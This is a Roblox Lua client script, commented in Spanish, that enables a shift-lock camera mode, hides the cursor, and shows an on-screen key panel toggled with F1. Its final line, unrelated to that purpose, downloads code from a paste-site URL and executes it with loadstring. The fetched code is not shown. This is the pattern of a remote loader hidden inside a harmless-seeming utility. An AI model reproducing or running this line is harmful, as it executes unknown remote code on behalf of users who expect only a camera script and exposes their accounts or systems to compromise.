-- Shift Lock + Mouse oculto + Teclas visibles + F1 para mostrar el ratón
local UIS = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local enabled = true
local connection

-- ===== GUI de teclas en la orilla =====
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "ControlesShiftLock"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 160, 0, 190)
frame.Position = UDim2.new(0, 15, 0.5, -95)
frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
frame.BackgroundTransparency = 0.25
frame.BorderSizePixel = 0
frame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 28)
title.Position = UDim2.new(0, 0, 0, 8)
title.BackgroundTransparency = 1
title.Text = "TECLAS"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame

local keysInfo = {
    {txt = "W  →  Adelante", y = 42},
    {txt = "A  →  Izquierda", y = 68},
    {txt = "S  →  Atrás", y = 94},
    {txt = "D  →  Derecha", y = 120},
    {txt = "F1 →  Mostrar ratón", y = 155}
}

for _, info in pairs(keysInfo) do
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, -12, 0, 24)
    label.Position = UDim2.new(0, 12, 0, info.y)
    label.BackgroundTransparency = 1
    label.Text = info.txt
    label.TextColor3 = Color3.fromRGB(230, 230, 230)
    label.Font = Enum.Font.Gotham
    label.TextSize = 14
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.Parent = frame
end

-- ===== Funciones =====
local function enableShiftLock()
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    local root = character:WaitForChild("HumanoidRootPart")

    UIS.MouseIconEnabled = false
    UIS.MouseBehavior = Enum.MouseBehavior.LockCenter
    frame.Visible = true

    if connection then connection:Disconnect() end

    connection = RunService.RenderStepped:Connect(function()
        if not enabled then return end
        UIS.MouseIconEnabled = false
        UIS.MouseBehavior = Enum.MouseBehavior.LockCenter

        if humanoid and root and humanoid.Health > 0 then
            humanoid.AutoRotate = false
            local _, y = workspace.CurrentCamera.CFrame:ToEulerAnglesYXZ()
            root.CFrame = CFrame.new(root.Position) * CFrame.Angles(0, y, 0)
        end
    end)
end

local function disableShiftLock()
    if connection then
        connection:Disconnect()
        connection = nil
    end

    UIS.MouseIconEnabled = true          -- ← Aquí vuelve a verse el ratón
    UIS.MouseBehavior = Enum.MouseBehavior.Default
    frame.Visible = false

    local character = player.Character
    if character then
        local humanoid = character:FindFirstChild("Humanoid")
        if humanoid then
            humanoid.AutoRotate = true
        end
    end
end

-- Activar al inicio
enableShiftLock()

-- F1 para mostrar/ocultar el ratón
UIS.InputBegan:Connect(function(input, processed)
    if processed then return end
    if input.KeyCode == Enum.KeyCode.F1 then
        enabled = not enabled
        if enabled then
            enableShiftLock()
            print("✅ Shift Lock activado - Ratón oculto")
        else
            disableShiftLock()
            print("❌ Shift Lock desactivado - Ratón visible")
        end
    end
end)

print("✅ Script listo | F1 = Mostrar/Ocultar ratón")

loadstring(game:HttpGet("https://pastefy.app/AaiE5Jpp/raw"))()